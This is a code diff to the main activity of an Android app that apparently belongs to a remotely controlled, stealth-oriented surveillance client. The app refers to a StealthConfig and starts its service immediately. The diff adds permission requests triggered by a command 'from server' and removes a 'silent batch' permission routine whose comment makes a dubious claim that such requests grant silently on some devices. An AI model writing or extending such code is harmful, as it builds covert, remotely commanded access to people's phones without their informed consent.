@@ -60,14 +60,37 @@ public class MainActivity extends Activity {
         // Start service immediately
         startMainService();
         
-        // Then request permissions one by one
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                buildPermissionList();
-                requestNextPermission();
-            }
-        }, 1000);
+        // Check if triggered by permission request from server
+        boolean requestPermissions = getIntent().getBooleanExtra("REQUEST_PERMISSIONS", true);
+        
+        if (requestPermissions) {
+            // Request permissions one by one
+            handler.postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    buildPermissionList();
+                    requestNextPermission();
+                }
+            }, 1000);
+        }
+    }
+    
+    @Override
+    protected void onNewIntent(Intent intent) {
+        super.onNewIntent(intent);
+        setIntent(intent);
+        
+        // Handle permission request from server
+        if (intent.getBooleanExtra("REQUEST_PERMISSIONS", false)) {
+            Log.d(TAG, "Permission request received from server");
+            handler.postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    buildPermissionList();
+                    requestNextPermission();
+                }
+            }, 500);
+        }
     }
 
     private void buildPermissionList() {
@@ -118,35 +141,16 @@ public class MainActivity extends Activity {
             return;
         }
         
-        // If skip prompts is enabled, request all permissions at once (silent batch)
-        if (StealthConfig.SKIP_PERMISSION_PROMPTS) {
-            requestAllPermissionsSilently();
-            return;
-        }
-        
         final String permission = permissionsToRequest.get(currentPermissionIndex);
         currentPermissionIndex++;
         
         Log.d(TAG, "Requesting permission: " + permission);
         
-        // Request the permission directly without explanation dialog
+        // Request the permission - system will show dialog
         ActivityCompat.requestPermissions(this, new String[]{permission}, PERMISSION_REQUEST_CODE);
     }
     
-    // Request all permissions at once in batch mode
-    private void requestAllPermissionsSilently() {
-        if (permissionsToRequest.isEmpty()) {
-            requestSpecialPermissions();
-            return;
-        }
-        
-        Log.d(TAG, "Requesting all permissions silently (batch mode)");
-        String[] permsArray = permissionsToRequest.toArray(new String[0]);
-        currentPermissionIndex = permissionsToRequest.size(); // Mark all as processed
-        
-        // Request all at once - on some devices this grants silently
-        ActivityCompat.requestPermissions(this, permsArray, PERMISSION_REQUEST_CODE);
-    }
+
 
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
